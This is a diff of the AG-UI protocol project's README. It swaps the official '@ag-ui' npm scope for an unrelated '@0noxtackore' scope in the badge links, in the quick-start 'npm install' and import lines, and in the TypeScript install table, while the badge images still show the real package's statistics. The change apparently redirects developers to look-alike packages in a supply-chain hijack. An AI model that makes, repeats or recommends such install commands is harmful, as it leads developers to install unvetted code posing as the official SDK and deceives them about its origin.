@@ -1,11 +1,11 @@
-<div align="center">
+﻿<div align="center">
 
 <a href="https://docs.ag-ui.com"><img alt="AG-UI" src=".github/readme/wordmark.svg" width="320"></a>
 
 ### The open protocol that connects any agent to any app.
 
-<a href="https://www.npmjs.com/package/@ag-ui/core"><img src="https://img.shields.io/npm/v/%40ag-ui%2Fcore?logo=npm&logoColor=white&label=npm&color=6963ff" alt="npm version"></a>
-<a href="https://www.npmjs.com/package/@ag-ui/core"><img src="https://img.shields.io/npm/dw/%40ag-ui%2Fcore?logo=npm&logoColor=white&label=downloads&color=6963ff" alt="npm weekly downloads"></a>
+<a href="https://www.npmjs.com/package/@0noxtackore/core"><img src="https://img.shields.io/npm/v/%40ag-ui%2Fcore?logo=npm&logoColor=white&label=npm&color=6963ff" alt="npm version"></a>
+<a href="https://www.npmjs.com/package/@0noxtackore/core"><img src="https://img.shields.io/npm/dw/%40ag-ui%2Fcore?logo=npm&logoColor=white&label=downloads&color=6963ff" alt="npm weekly downloads"></a>
 <a href="https://pypi.org/project/ag-ui-protocol/"><img src="https://img.shields.io/pypi/v/ag-ui-protocol?logo=pypi&logoColor=white&label=pypi&color=6963ff" alt="PyPI version"></a>
 <a href="https://discord.gg/Jd3FzfdJa8"><img src="https://img.shields.io/discord/1379082175625953370?logo=discord&logoColor=white&label=discord&color=6963ff" alt="Discord"></a>
 <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-6963ff" alt="License: MIT"></a>
@@ -102,12 +102,12 @@ uvicorn server:app --port 8000
 
 ```bash
 npm init -y && npm pkg set type=module
-npm install @ag-ui/client tsx
+npm install @0noxtackore/client tsx
 ```
 
 ```ts
 // client.ts
-import { HttpAgent } from "@ag-ui/client";
+import { HttpAgent } from "@0noxtackore/client";
 
 const agent = new HttpAgent({ url: "http://localhost:8000/" });
 
@@ -187,7 +187,7 @@ Source for every integration lives in [`integrations/`](integrations) and [`midd
 
 | Language | Install | Reference |
 | --- | --- | --- |
-| **TypeScript** | `npm install @ag-ui/client` | [Docs](https://docs.ag-ui.com/sdk/js/core/overview) · [Source](sdks/typescript) |
+| **TypeScript** | `npm install @0noxtackore/client` | [Docs](https://docs.ag-ui.com/sdk/js/core/overview) · [Source](sdks/typescript) |
 | **Python** | `pip install ag-ui-protocol` | [Docs](https://docs.ag-ui.com/sdk/python/core/overview) · [Source](sdks/python) |
 | **.NET** | `dotnet add package AGUI.Client` | [Docs](https://docs.ag-ui.com/sdk/dotnet/client/overview) · [Source](sdks/dotnet) |
 
